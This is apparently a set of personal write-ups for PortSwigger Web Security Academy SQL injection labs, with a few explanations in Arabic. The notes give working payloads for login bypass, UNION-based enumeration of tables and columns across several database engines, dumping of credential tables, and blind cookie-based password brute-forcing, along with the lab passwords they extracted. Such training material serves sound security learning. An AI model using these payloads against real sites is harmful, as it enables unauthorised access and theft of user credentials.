# Sqli 

<details>
  <summary>Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</summary>

> ### This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

---
 
* ```url
  /filter?category=Pets
  ```
  * ```url
    /filter?category=Pets' or 1=1 --
    ```

  
</details>







<details>
  <summary>Lab: SQL injection vulnerability allowing login bypass</summary>

> ###  This lab contains a SQL injection vulnerability in the login function.
* > To solve the lab, perform a SQL injection attack that logs in to the application as the ``administrator`` user.

---


```url
csrf=Wf2ku02yY3tefRdA4rFJfn8d1Z48oOeq&username=user&password=pass
```
put username = ``administrator" --`` and write any passowrd it will be ignored anyway and if ``'`` not work try ``"``

```url
csrf=Wf2ku02yY3tefRdA4rFJfn8d1Z48oOeq&username=administrator' --&password=pass
```

  
</details>




<details>
  <summary>Lab: SQL injection attack, querying the database type and version on Oracle ⚠️</summary>

> ###  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
* > To solve the lab, display the database version string. 

* <details>
     <summary>Hint</summary>

  On Oracle databases, every ``SELECT`` statement must specify a table to select ``FROM``. If your ``UNION SELECT`` attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
  
  There is a built-in table on Oracle called ``dual`` which you can use for this purpose. For example: ``UNION SELECT 'abc' FROM dual``   

  </details>


⚠️⚠️
<details>
  <summary>aobut union injection</summary>

✅ أولاً: "تتأكد إن أنواع البيانات في الأعمدة المتحده (unioned) متوافقة" يعني إيه؟
لما تستخدم ``UNION``، انت بتدمج نتيجتين مع بعض، فلازم الأعمدة اللي في الاستعلام الأول والتاني يكونوا نفس العدد ونفس نوع البيانات.

مثال توضيحي:
لو الاستعلام الأصلي بيرجع:

```sql
id (رقم), name (نص), email (نص)
```

فأنت لازم تكتب: 

```sql
UNION SELECT 1, 'admin', 'admin@example.com'
```
  
</details>
⚠️⚠️

----


```
/filter?category=Gifts
```
first check number of coulmns :

* ```url
  /filter?category=Gifts'union select null FROM dual--
  ```

* ```url
  /filter?category=Gifts'union select null,null FROM dual--
  ```

for check type of coulmns :

* ```url
  /filter?category=Gifts'union select 'a','a' FROM dual--
  ```

now try to know database version :

* **``Oracle :``**
   * ``SELECT banner FROM v$version``
   * ``SELECT version FROM``
   * ``v$instance``

* **``Microsoft :``**
   * ``SELECT @@version`` 

* **``PostgreSQL :``**
   * ``SELECT version()``

* **``MySQL :``**
   * ``SELECT @@version`` 



* ```url
  /filter?category=Gifts'union SELECT banner,NULL FROM v$version--
  ```



  
</details>








<details>
  <summary>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</summary>


> ###  This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
> To solve the lab, display the database version string. 


---

```url
'+UNION+SELECT+'abc','def'#
```

* ```
  '+UNION+SELECT+@@version,+NULL#
  ```

  
</details>






<details>
  <summary>Lab: SQL injection attack, listing the database contents on non-Oracle databases ⚠️</summary>

> ###  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
> ### The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
> To solve the lab, log in as the ``administrator`` user. 


---

```
/filter?category=Gifts' union select NULL,NULL--
```

* <details>
     <summary>⚠️list tables in database⚠️</summary>




  
  ## 🔍 1. Determine the Number of Columns
  
  ```sql
  ' ORDER BY 1--
  ' ORDER BY 2--
  ...
  ' ORDER BY N--
  ```
  
  أوقف عند أول رقم يعطيك خطأ → عدد الأعمدة هو الرقم السابق.
  
  أو باستخدام `UNION SELECT NULL`:
  
  ```sql
  ' UNION SELECT NULL--
  ' UNION SELECT NULL,NULL--
  ' UNION SELECT NULL,NULL,NULL--
  ```
  
  حتى لا يظهر خطأ.
  
  ---
  
  ## 🧠 2. Find Reflectable Columns (أي عمود يظهر على الصفحة)
  
  ```sql
  ' UNION SELECT 'a', NULL--
  ' UNION SELECT NULL, 'a'--
  ```
  
  غيّر مكان `'a'` لترى أين يظهر على الصفحة.
  
  ---
  
  
  
  ## 📋 4. List Tables in the Database
  
  ### 🐬 MySQL
  
  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
  ```
  
  ### 🐘 PostgreSQL
  
  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='public'--
  ```
  
  ### 🪟 MSSQL
  
  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables--
  -- OR --
  ' UNION SELECT name, NULL FROM sys.tables--
  ```
  
  ### 🟠 Oracle
  
  ```sql
  ' UNION SELECT table_name, NULL FROM all_tables--
  ```
  
  ---
  
  ## 📑 5. List Columns in a Table
  
  ### 🐬 MySQL
  
  ```sql
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```
  
  ### 🐘 PostgreSQL
  
  ```sql
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```
  
  ### 🪟 MSSQL
  
  ```sql
  ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```
  
  ---
  
  ## 🧪 Example (MySQL)
  
  - Suppose we know the number of columns is 2, and the first column reflects to the page:
  
  ```sql
  ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
  ```
  

  
 

     
   </details>


* ```sql
  '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
  ```

![image](https://github.com/user-attachments/assets/5dca3238-d8de-478c-9975-a5e940982015)

```
users_qtmswl
```

found tables 

* ```sql
  '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_qtmswl'--
  ```

found colums:

```
username_xwttla
email
password_ztcwwk
```

* ```sql
  ' UNION+SELECT username_xwttla, password_ztcwwk FROM users_qtmswl--
  ```

![image](https://github.com/user-attachments/assets/c759f3d6-5a1b-4884-885e-9b4ac82fa789)

```
administrator : 3cwvdutv09z9slmekkwm
```
  
</details>






<details>
  <summary>Lab: SQL injection attack, listing the database contents on Oracle</summary>


> ###  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
> ### The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
> To solve the lab, log in as the administrator user. 

---


```
'+UNION+SELECT+'abc','def'+FROM+dual--
```

```sql
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

* ```
  USERS_PURPGR
  ```

```
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_PURPGR'--
```

* ```
  PASSWORD_BGNVEO
  USERNAME_WWJQEC
  ```

```
'+UNION+SELECT+USERNAME_WWJQEC,+ PASSWORD_BGNVEO+FROM+USERS_PURPGR--
```

* ```
  administrator
	io37vj2yyj6q36piu2uo
  carlos
	gthqs6kajajbsnpy9xc1
  wiener
	46bp8uni00wnytsv0yob
  ```



  
</details>







<details>
   <summary>Lab: SQL injection UNION attack, determining the number of columns returned by the query</summary>

> ###  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
> To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values. 


---

```SQL
/filter?category=Pets' union select NULL --
```

```SQL
/filter?category=Pets' union select NULL,NULL --
```

```SQL
/filter?category=Pets' union select NULL,NULL,NULL --
```





</details>







<details>
	<summary>Lab: SQL injection UNION attack, finding a column containing text</summary>

> ###  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

> The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 


---

```url
/filter?category=Gifts' union select 'a',NULL,NULL --
```

```url
/filter?category=Gifts' union select NULL,'a',NULL --    <== correct one
```

```url
/filter?category=Gifts' union select NULL,NULL,'a' --
```
 
</details>










<details>
	<summary>Lab: SQL injection UNION attack, retrieving data from other tables</summary>


> ###  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

> #### The database contains a different table called ``users``, with columns called ``username`` and ``password``.

> To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the ``administrator`` user. 

---


```url
/filter?category=Pets' union select null,null--
```


```url
/filter?category=Pets' union select username,password from users --
```

* ```
  wiener
	n94f86gz294x7zoonr1z
  administrator
	necgrjfgn42l9sxu160v
  carlos
	sunapc1n4575hvqzdaa1
  ```







 
</details>














<details>
	<summary>Lab: SQL injection UNION attack, retrieving multiple values in a single column</summary>


> ###  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

> #### The database contains a different table called ``users``, with columns called ``username`` and ``password``.

> To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the ``administrator`` user.


---

do concatenate to values in one column 

```url
/filter?category=Gifts' union select null,username ||' ==> '|| password from users --
```

![image](https://github.com/user-attachments/assets/3e6dd0bf-cb7c-4d21-92e5-14177f69629e)


* ```
  administrator ==> qicuka8mgvvmtdzjsk76
  wiener ==> y48w02o728mfhp76c9u3
  carlos ==> n4k3vrh25quekpp6ieje
  ```

 
</details>





---


<details>
	<summary>Lab: Blind SQL injection with conditional responses (boolan)</summary>

> ###  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

> #### The results of the SQL query are not returned, and no error messages are displayed. But the application includes a ``Welcome back`` message in the page if the query returns any rows.The database contains a different table called ``users``, with columns called ``username`` and ``password``. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

> To solve the lab, log in as the ``administrator`` user. 



---


```http
GET / HTTP/1.1

Host: 0ab3003c04435bb280113582003400f4.web-security-academy.net
Cookie: TrackingId=sBgKk2u4kNA0mWuX; session=vLPAZFMJ5ApvFggeT85YmjbwpttZwrj8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive


```

Notice :

```http
TrackingId=sBgKk2u4kNA0mWuX;
```

First to check if it vuln or not 

```
TrackingId=sBgKk2u4kNA0mWuX' and 1=1 --;
```
notice ``Welcome Back`` appear in page

![image](https://github.com/user-attachments/assets/738470a1-011a-4fa1-bd7e-c8a655248a27)

now make sure that there is user call ``adminstrator`` by using subquery check :

```sql
' and (SELECT  'a' FROM users WHERE username='administrator')='a' --
```

if user exist

* ```sql
  ' and 'a' = 'a' --  == True
  ```

Now start Exploiting

```
' and (SELECT  'a' FROM users WHERE username='administrator' AND LENGTH(password)=1 )='a' --
```
send request to intruder and put numbers instead of 1 until 30 for example and grep&match ``Welcome back!``see when it change the response here it is ``20``

![image](https://github.com/user-attachments/assets/29e4e810-5dbe-47e1-9e7e-31e3fefdb857)


```http
[1]  [2]  [3]  [4]  [5]  [6]  [7]  [8]  [9]  [10]  [11]  [12]  [13]  [14]  [15]  [16]  [17]  [18]  [19] [20]
```

```sql
' and (SELECT  SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' --
                                 [1]                                              [2]
```

> first ``1`` refer to first char from passowrd second ``1`` refer to this query will retrun one char 

IN INTRUDER MAKE ATTACK TYPE FROM sniper TO cluster bomb TO MULTIPLE PAYLOAD { [1],[2] } NOW IN FIRST PAYLOAD [1] MAKE IT TRY 
      FROM 1 TO 20 AND IN SECOND PAYLOAD [2] TRY FORM [a-z+0-9] AND IN SETTINGS OF INRUDER MAKE GREP-MATCH WITH YOUR VALUE 
      IN THIS EXAMPLE IS " Welcome Back! " NOW IT WILL BRUTE FORCE AND YOU WILL GIT THE PASSWORD

```
[1]  [2]  [3]  [4]  [5]  [6]  [7]  [8]  [9]  [10]  [11]  [12]  [13]  [14]  [15]  [16]  [17]  [18]  [19] [20]
 p    m    i    w    y    x    x    o    a    o     z     p     b     1     x     o     c     m     q    j
```

```
pmiwyxxoaozpb1xocmqj
```
 
</details>
































## [Portsqigger cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)



































